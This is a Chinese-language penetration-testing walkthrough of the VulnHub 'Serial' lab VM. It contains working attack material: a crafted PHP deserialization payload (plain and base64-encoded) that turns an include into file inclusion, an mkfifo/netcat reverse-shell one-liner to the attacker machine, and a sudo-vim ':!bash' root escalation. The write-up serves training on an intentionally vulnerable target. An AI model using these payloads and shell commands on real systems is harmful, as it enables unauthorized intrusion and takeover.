# vulnhub靶场serial-php渗透

## 靶场下载地址

```bash
https://www.vulnhub.com/entry/serial-1,349/
```

## 信息搜集

开启靶场并未得到任何信息

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527153402756.png" alt="image-20230527153402756" style="zoom: 50%;" />

对本地环境做arp扫描获取靶机IP地址 - 192.168.231.134 就是靶机的IP地址

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/Cknife]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.128
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
192.168.231.134 00:0c:29:67:a0:c4       VMware, Inc.
192.168.231.254 00:50:56:e6:26:4d       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.898 seconds (134.88 hosts/sec). 4 responded
```

nmap扫描获取靶机的详细信息 - 发现靶场开启了80和22端口

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/Cknife]
└─# nmap 192.168.231.134
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 15:35 CST
Nmap scan report for 192.168.231.134
Host is up (0.00031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:67:A0:C4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

进入网页查看

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527153921307.png" alt="image-20230527153921307" style="zoom:50%;" />

这里没有任何的头绪，现在做一个目录爆破 - 这里发现一个可下载文件 backup。下载下来得到源码

```
──(root㉿pinginglab)-[/home/pinginglab]
└─# dirsearch -u "http://192.168.231.134/"

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.231.134/-_23-05-27_14-14-19.txt

Error Log: /root/.dirsearch/logs/errors-23-05-27_14-14-19.log

Target: http://192.168.231.134/

[14:14:19] Starting: 
[14:14:20] 403 -  301B  - /.ht_wsr.txt                                     
[14:14:20] 403 -  306B  - /.htaccess.sample                                
[14:14:20] 403 -  304B  - /.htaccess.bak1
[14:14:20] 403 -  304B  - /.htaccess.orig
[14:14:20] 403 -  304B  - /.htaccess.save
[14:14:20] 403 -  302B  - /.htaccess_sc
[14:14:20] 403 -  304B  - /.htaccess_orig
[14:14:20] 403 -  305B  - /.htaccess_extra
[14:14:20] 403 -  303B  - /.htaccessOLD2
[14:14:20] 403 -  302B  - /.htaccessOLD
[14:14:20] 403 -  302B  - /.htaccessBAK
[14:14:20] 403 -  295B  - /.html                                           
[14:14:20] 403 -  294B  - /.htm
[14:14:20] 403 -  304B  - /.htpasswd_test                                  
[14:14:20] 403 -  300B  - /.htpasswds                                      
[14:14:20] 403 -  301B  - /.httr-oauth
[14:14:22] 403 -  294B  - /.php                                            
[14:14:46] 301 -  319B  - /backup  ->  http://192.168.231.134/backup/       
[14:14:46] 200 -  942B  - /backup/                                          
[14:14:51] 200 -   52B  - /index.php                                        
[14:14:51] 200 -   52B  - /index.php/login/                                 
[14:15:07] 403 -  304B  - /server-status/                                   
[14:15:07] 403 -  303B  - /server-status                                    
                                                                             
Task Completed
```

## 源码审计

==**index.php**==

```php
<?php
	include("user.class.php");

	if(!isset($_COOKIE['user'])) {
		setcookie("user", base64_encode(serialize(new User('sk4'))));
	} else {
		unserialize(base64_decode($_COOKIE['user']));
	}
	echo "This is a beta test for new cookie handler\n";
?>
```

==**log.class.php**==

```bash
<?php
  class Log {
    private $type_log;

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>
```

==**user.class.php**==

```php
<?php
  include("log.class.php");

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      $this->wel = new Welcome();
    }

    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }

?>
```

### 反序列化payload构造

主要思路是通过`User`类中的`wei`变量实例化`Log`类以成功利用`include`函数实现文件包含漏洞；这里要记住：反序列化输出之后，要修改`User`类中的`$wei`变量类型为“受保护的”，并对序列化字符串做修改，将`$wei`类型也改回“受保护的”类型；并且空使用`$00`代替

```php
<?php

class Log
{
    private $type_log = '/etc/passwd';

    public function handler($val)
    {
        include($this->type_log);
        echo "LOG: " . $val;
    }
}


class User
{
    private $name;
    public $wel;

    function __destruct()
    {
        //echo "bye\n";
        $this->wel->handler($this->name);
    }
}

$user = new User();
$user->wel = new Log();
echo "\n";
echo serialize($user);
```

==输出==

```php
O:4:"User":2:{s:10:"%00User%00name;s:8:"flag.php";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:11:"/etc/passwd";}}
```

观察`index.php`，对于cookie的操作是需要使用`base64`解码的。所以我们需要对字符串做二次处理

```php
<?php
$str = 'O:4:"User":2:{s:10:"%00User%00name;s:8:"flag.php";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:11:"/etc/passwd";}}';
$str = urldecode($str);
$str = base64_encode($str);
echo $str;
```

==输出==

```
Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=
```

Hackbar 输出

![image-20230527155928712](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527155928712.png)

## 渗透测试

文件包含漏洞分为两类：

+ 远程文件包含
+ 本地文件包含

我们此时尝试远程文件包含，Kali搭建apache服务器

![image-20230527160124530](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160124530.png)

修改反序列化字符串

```
O:4:"User":2:{s:10:"%00User%00name";s:3:"sk4";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:33:"http://192.168.231.128/system.txt";}}
```

编码：

```
Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjMzOiJodHRwOi8vMTkyLjE2OC4yMzEuMTI4L3N5c3RlbS50eHQiO319
```

执行成功：

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160243080.png" alt="image-20230527160243080" style="zoom:50%;" />

## shell会弹

推荐网站：

```
https://www.iculture.cc/rce/
```

回弹payload

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+192.168.231.128+9999+>/tmp/f
```

Kali开启监听

```
nc -lvnp 9999
```

BP 发送回弹

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160647471.png" alt="image-20230527160647471" style="zoom:50%;" />

nc 成功回弹

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160711327.png" alt="image-20230527160711327" style="zoom:50%;" />

## 内网提权

sudo 命令尝试

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160735793.png" alt="image-20230527160735793" style="zoom:50%;" />

返回根目录发现用户密码

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160937947.png" alt="image-20230527160937947" style="zoom:50%;" />

ssh 登录服务器 - 登录成功！

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161011529.png" alt="image-20230527161011529" style="zoom:50%;" />

此时sudo vim 不需要密码

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161037878.png" alt="image-20230527161037878" style="zoom:50%;" />

vim中执行命令`!bash`提权成功

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161119459.png" alt="image-20230527161119459" style="zoom:50%;" />

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161127842.png" alt="image-20230527161127842" style="zoom:50%;" />

```
在vim中，你可以使用 :! 命令来运行一个外部系统命令。例如，你可以使用 :!bash 来启动一个bash shell并执行命令，而不需要退出vim1。如果你在vim中以sudo用户身份打开文件，那么你在vim中执行的命令也将以sudo用户身份执行。
```

